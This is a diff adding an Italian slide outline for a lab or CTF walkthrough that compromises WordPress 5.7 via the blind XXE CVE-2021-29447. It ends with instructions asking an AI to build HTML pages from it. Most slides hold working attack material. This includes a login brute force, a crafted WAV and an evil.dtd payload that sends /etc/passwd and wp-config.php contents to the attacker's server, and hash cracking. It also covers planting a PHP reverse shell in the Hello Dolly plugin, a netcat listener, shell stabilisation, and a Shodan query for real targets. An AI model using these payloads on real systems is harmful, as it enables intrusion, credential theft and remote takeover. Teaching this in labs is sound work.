@@ -1,0 +1,326 @@
+
+**Scenario:** WordPress 5.7 Vulnerabile - Dalla scansione alla Reverse Shell stabile.
+**Layout:** 2 Colonne (Sinistra: Azione/Comandi - Destra: Spiegazione Tecnica).
+
+-----
+
+### [SLIDE 1: Configurazione WPScan]
+
+**Titolo:** Preparazione: Setup dell'Intelligence
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+    1.  Creare account su `wpscan.com`.
+    2.  Ottenere API Token.
+    3.  `nano ~/.wpscan/scan.yml`
+    4.  Inserire:
+        ```yaml
+        cli_options:
+          api_token: 'IL_TUO_TOKEN_QUI'
+        ```
+  * **COLONNA DESTRA (Teoria):**
+      * **Perché l'API Token?** WPScan funziona anche senza, ma usa un database locale limitato. Con il token, interroga in tempo reale il database di Automattic (l'azienda dietro WP), garantendo la rilevazione delle vulnerabilità più recenti.
+      * **Il file YAML:** È la configurazione persistente per evitare di dover incollare il token chilometrico ad ogni comando.
+
+### [SLIDE 2: Visual Inspection & Hardening]
+
+**Titolo:** Ricognizione: Accesso e Esposizione Admin
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Navigare su `http://IP_TARGET`.
+      * Verificare esistenza `http://IP_TARGET/wp-admin`.
+      * **Risultato:** Pannello di login esposto.
+  * **COLONNA DESTRA (Teoria):**
+      * **Il Rischio:** Esporre `/wp-admin` permette attacchi di forza bruta e sfruttamento di vulnerabilità note del core.
+      * **Come Mitigare (Hardening):**
+        1.  **IP Allow-listing:** Configurare `.htaccess` o Nginx per accettare connessioni a quella cartella solo dal tuo IP statico (VPN aziendale).
+        2.  **2FA:** Plugin per autenticazione a due fattori.
+        3.  **Obfuscation (Security through obscurity):** Cambiare URL di login (meno efficace, ma riduce il rumore dei bot).
+
+### [SLIDE 3: Vulnerability Scan Aggressivo]
+
+**Titolo:** Scansione: Rilevazione Plugin e Core
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Comando:** `wpscan --url http://10.80.128.91 -e vp,vt --plugins-detection aggressive`
+      * **Output:** Trovata **CVE-2021-29447**.
+      * **Descrizione:** Authenticated XXE (XML External Entity).
+  * **COLONNA DESTRA (Teoria):**
+      * **Flag `-e vp,vt`:** Enumera Plugin Vulnerabili (vp) e Temi Vulnerabili (vt).
+      * **Detection Aggressive:** WPScan fa richieste invasive per improntare le versioni esatte, analizzando l'HTML sorgente e i file statici (readme.txt, changelog) dei plugin.
+      * **La CVE:** WordPress 5.7 (e precedenti) gestisce male i file multimediali audio. Usa una libreria per leggere i metadati ID3 che permette l'iniezione di entità XML esterne.
+
+### [SLIDE 4: Analisi della CVE-2021-29447]
+
+**Titolo:** Deep Dive: Cos'è una XXE?
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Diagramma Concettuale):**
+      * [Immagine schematica: File WAV -\> Parser XML WP -\> Richiesta a server esterno -\> Lettura File Locale]
+  * **COLONNA DESTRA (Teoria):**
+      * **XXE (XML External Entity):** È una vulnerabilità che si verifica quando un parser XML accetta input malevolo contenente riferimenti a entità esterne.
+      * **Il vettore:** I file `.wav` supportano uno standard di metadati chiamato **iXML**.
+      * **L'Errore:** WordPress, nel tentativo di estrarre "Artista" o "Titolo" dal file audio caricato, parsa l'XML contenuto nel file senza disabilitare il caricamento di entità esterne. Questo ci permette di dire al server: *"Per leggere il titolo della canzone, vai a leggere il file `/etc/passwd`"*.
+
+### [SLIDE 5: Brute Force & Accesso Iniziale]
+
+**Titolo:** Accesso: Ottenere un punto d'appoggio
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Obiettivo:** La CVE richiede un utente autenticato (anche con permessi minimi) che possa caricare file.
+      * **Comando:** `wpscan --url http://target -U test-corp -P /usr/share/wordlists/rockyou.txt`
+      * **Risultato:** Password trovata (`test`). Accesso effettuato.
+  * **COLONNA DESTRA (Teoria):**
+      * **Authenticated Exploit:** Molte vulnerabilità critiche di WP richiedono di essere "dentro". Per questo le password deboli degli utenti "Author" o "Editor" sono pericolose quanto quelle degli Admin.
+      * **Libreria Media:** Una volta dentro, verifichiamo di poter caricare file nella "Media Library". È lì che avviene il parsing del file WAV malevolo.
+
+### [SLIDE 6: Preparazione Infrastruttura (OOB)]
+
+**Titolo:** Setup: Out-Of-Band (OOB) Server
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Comando:** `php -S 0.0.0.0:1234`
+      * **Stato:** Server in ascolto sulla porta 1234.
+  * **COLONNA DESTRA (Teoria):**
+      * **Perché un server nostro?** L'attacco è **Blind XXE**. Quando carichiamo il file WAV, WordPress non ci mostra a schermo il contenuto di `/etc/passwd`.
+      * **La Strategia:** Dobbiamo costringere il server vittima a "telefonare a casa" (al nostro server PHP) portandosi dietro i dati rubati come parte dell'URL. Questo server servirà sia per ospitare il payload DTD, sia per ricevere i dati esfiltrati.
+
+### [SLIDE 7: Creazione Payload (WAV + iXML)]
+
+**Titolo:** Weaponization: Costruire il Cavallo di Troia (WAV)
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **File:** `poc.wav`
+      * **Hex/Code:**
+        ```bash
+        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://MIO_IP:1234/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+        ```
+  * **COLONNA DESTRA (Teoria):**
+      * **Anatomia del file:** Non è un vero audio.
+          * `RIFF...WAVE`: Header standard per dire "Sono un file audio".
+          * `iXML`: Il chunk magico che WordPress cercherà di leggere.
+      * **Il Payload XML:** Definisce un'entità `%remote` che punta al nostro server. Dice al parser: *"Scarica ed esegui le istruzioni contenute in `evil.dtd`"*.
+
+### [SLIDE 8: Creazione Payload (DTD Esterno)]
+
+**Titolo:** Weaponization: Le istruzioni di furto (DTD)
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **File:** `evil.dtd`
+      * **Contenuto:**
+        ```xml
+        <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+        <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://MIO_IP:1234/?p=%file;'>" >
+        ```
+  * **COLONNA DESTRA (Teoria):**
+      * **DTD (Document Type Definition):** Definisce la struttura dell'XML. Qui lo usiamo per concatenare azioni.
+      * **Wrapper PHP:** `php://filter/...`. Fondamentale. Non leggiamo il file grezzo (che potrebbe rompere l'XML con caratteri speciali). Lo comprimiamo (`zlib`) e lo codifichiamo in `base64`.
+      * **Exfiltration:** La variabile `%trick` invia una richiesta HTTP al nostro server mettendo il contenuto del file (codificato) nel parametro `?p=`.
+
+### [SLIDE 9: Esecuzione e Primo Contatto]
+
+**Titolo:** Exploit: Caricamento e Trigger
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+    1.  Dashboard WP -\> Media -\> Aggiungi Nuovo.
+    2.  Selezionare `payload.wav`.
+    3.  Osservare il terminale con `php -S`.
+    4.  **Log:** `GET /?p=fVPNauMwEP4qh...`
+  * **COLONNA DESTRA (Teoria):**
+      * **Il Momento della Verità:** Appena WP tenta di processare l'immagine ("Crunching..." o generazione miniature), il parser XML si attiva.
+      * **Il Traffico:** Il server vittima si connette a noi. Abbiamo conferma RCE (Remote Code Execution, o meglio, Arbitrary File Read).
+
+### [SLIDE 10: Decodifica dei Dati]
+
+**Titolo:** Analisi: Decodifica Base64
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Copiare la stringa dopo `?p=`.
+      * Tool: CyberChef o terminale (`base64 -d`).
+      * **Risultato:** Contenuto di `/etc/passwd`.
+  * **COLONNA DESTRA (Teoria):**
+      * Abbiamo letto un file di sistema.
+      * Vediamo gli utenti (`root`, `www-data`, etc.).
+      * **Limite:** Non possiamo vedere le password qui (sono in `/etc/shadow` e servono permessi root).
+      * **Next Step:** Dobbiamo puntare a file che contengono credenziali in chiaro.
+
+### [SLIDE 11: Pivot verso wp-config.php]
+
+**Titolo:** Target: Il cuore di WordPress
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Modifica di `evil.dtd`.
+      * Nuova Resource: `/var/www/html/wp-config.php`
+      * Ricaricamento del file WAV (spesso serve rinominarlo o cancellare il vecchio).
+  * **COLONNA DESTRA (Teoria):**
+      * **Perché wp-config?** È il file più prezioso. Contiene:
+          * Credenziali del Database (User/Pass).
+          * Keys di salting.
+          * Prefisso tabelle.
+      * **Percorso:** Spesso dobbiamo indovinare il percorso assoluto (`/var/www/html/`), ma `/etc/passwd` visto prima ci aiuta a capire la struttura delle home directory.
+
+### [SLIDE 12: Estrazione Credenziali DB]
+
+**Titolo:** Looting: Credenziali Database in chiaro
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Decodifica del nuovo Base64 ricevuto.
+      * **Lettura Codice:**
+        ```php
+        define( 'DB_NAME', 'wordpressdb2' );
+        define( 'DB_USER', 'thedarktangent' );
+        define( 'DB_PASSWORD', 'sUp3rS3cret132' );
+        ```
+  * **COLONNA DESTRA (Teoria):**
+      * Abbiamo le chiavi del regno, ma "solo" del database, non ancora dell'admin panel di WP (anche se spesso le password vengono riutilizzate).
+      * La password è in chiaro perché PHP deve poterla leggere per connettersi a MySQL.
+
+### [SLIDE 13: Accesso al Database MySQL]
+
+**Titolo:** Database: Connessione e Dump
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Comando:** `mysql -u thedarktangent -p -h 10.82.x.x`
+      * **Query:**
+        1.  `use wordpressdb2;`
+        2.  `show tables;`
+        3.  `select * from wptry_users;`
+  * **COLONNA DESTRA (Teoria):**
+      * Ci connettiamo direttamente al servizio MySQL (porta 3306).
+      * Cerchiamo la tabella utenti (attenzione al prefisso personalizzato `wptry_` che è una buona pratica di sicurezza, ma inutile se leggiamo il config).
+      * Estraiamo gli Hash delle password degli amministratori.
+
+### [SLIDE 14: Analisi degli Hash]
+
+**Titolo:** Crittografia: Identificazione Hash
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Tool:** `hash-identifier` o analisi visiva.
+      * **Formato:** `$P$B...` (Tipico Phpass/MD5 WordPress).
+      * **Azione:** Salvare l'hash in `hash.txt`.
+  * **COLONNA DESTRA (Teoria):**
+      * WordPress usa un algoritmo di hashing basato su MD5 con salt (Portable PHP password hashing framework).
+      * Non è reversibile, ma è craccabile tramite attacco a dizionario (brute force offline).
+
+### [SLIDE 15: Cracking con Hashcat]
+
+**Titolo:** Cracking: Rompere la cifratura
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Comando:** `hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt`
+      * **Risultato:** `corp-001:teddybear`
+  * **COLONNA DESTRA (Teoria):**
+      * **`-m 400`:** È il codice identificativo per WordPress (MD5) in Hashcat.
+      * **Rockyou.txt:** Una wordlist contenente 14 milioni di password reali trapelate.
+      * **Velocità:** MD5 è un algoritmo veloce, le GPU moderne possono provare miliardi di combinazioni al secondo.
+
+### [SLIDE 16: Admin Login & Preparazione RCE]
+
+**Titolo:** Escalation: Diventare Admin
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Logout dall'utente base.
+      * Login con `corp-001` / `teddybear`.
+      * Accesso completo alla Dashboard Admin.
+  * **COLONNA DESTRA (Teoria):**
+      * Ora siamo amministratori del CMS.
+      * **Obiettivo finale:** Ottenere una shell sul server (RCE).
+      * Come admin, possiamo modificare il codice PHP del sito (tramite Editor Temi o Editor Plugin).
+
+### [SLIDE 17: Preparazione Reverse Shell]
+
+**Titolo:** Weaponization: PHP Reverse Shell
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * Scaricare `php-reverse-shell.php` (PentestMonkey).
+      * Modifica variabili:
+          * `$ip = 'MIO_IP_VPN';`
+          * `$port = 4444;`
+  * **COLONNA DESTRA (Teoria):**
+      * **Reverse Shell:** È il server che si connette a noi (bypassando i firewall in ingresso).
+      * Questo script PHP apre un socket verso il nostro IP e redireziona l'input/output di `/bin/sh` attraverso quel socket.
+
+### [SLIDE 18: Iniezione nel Plugin]
+
+**Titolo:** Injection: Modifica di Hello Dolly
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+    1.  Menu "Plugin" -\> "Editor file del plugin".
+    2.  Selezionare "Hello Dolly".
+    3.  Sostituire tutto il codice con la nostra Reverse Shell.
+    4.  Salvare ("Update File").
+    5.  **IMPORTANTE:** Avviare listener: `nc -lvnp 4444`.
+  * **COLONNA DESTRA (Teoria):**
+      * **Perché Hello Dolly?** È un plugin presente di default su tutte le installazioni WP, spesso inattivo e dimenticato. È il nascondiglio perfetto per una backdoor temporanea.
+      * L'editor di plugin interno di WP è una "feature" pericolosissima se un account admin viene compromesso.
+
+### [SLIDE 19: Execution & Shell Access]
+
+**Titolo:** Pwned: Ottenere la Shell
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+    1.  Attivare il plugin "Hello Dolly" OPPURE navigare direttamente su `/wp-content/plugins/hello.php`.
+    2.  **Terminale Netcat:**
+        ```
+        connect to [10.10.x.x] from (UNKNOWN) [10.82.x.x] 4444
+        $ _
+        ```
+  * **COLONNA DESTRA (Teoria):**
+      * Attivando il plugin o visitando il file, il server web esegue il codice PHP.
+      * Il codice PHP esegue la connessione verso il nostro Netcat.
+      * Ora abbiamo controllo diretto sul sistema operativo del server (solitamente come utente `www-data`).
+
+### [SLIDE 20: Flag & Stabilizzazione (Bonus)]
+
+**Titolo:** Post-Exploitation: Pulizia e Trofeo
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Azione):**
+      * **Flag:** `cat /home/stux/flag/flag.txt`
+      * **Stabilizzazione (Python Magic):**
+        1.  `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+        2.  `Ctrl+Z` (Background)
+        3.  `stty raw -echo; fg`
+        4.  `export TERM=xterm`
+  * **COLONNA DESTRA (Teoria):**
+      * **Shell Interattiva:** La shell grezza di netcat si chiude se premi Ctrl+C e non gestisce l'autocomplete.
+      * La sequenza di comandi a sinistra trasforma la connessione grezza in un terminale TTY completo e stabile, permettendo l'uso di `vim`, `top`, e `su`.
+
+### [SLIDE 21: Context & Shodan (Extra)]
+
+**Titolo:** Impatto Reale: Shodan & CVE Stats
+**Layout: 2 Colonne**
+
+  * **COLONNA SINISTRA (Visual):**
+      * [Immagine di Shodan o Statistiche CVE]
+      * Query Shodan: `product:"WordPress" version:"5.0"`
+  * **COLONNA DESTRA (Teoria):**
+      * Questa non è solo una CTF. Migliaia di server reali eseguono versioni obsolete di WordPress.
+      * La combinazione di configurazioni di default insicure (XML parsing attivo) e mancati aggiornamenti crea una superficie d'attacco enorme.
+-----
+
+### Istruzioni per l'IA:
+
+1.  Usa il layout e lo stile di ./esempio.html e i relativi style.css e main.js.
+2.  Evidenzia il codice (syntax highlighting).
+3.  Crea più file html navigabili dalla navbar, numerati da 1.html in poi
+4.  Utilizza spiegazioni esaurienti.
+
+-----
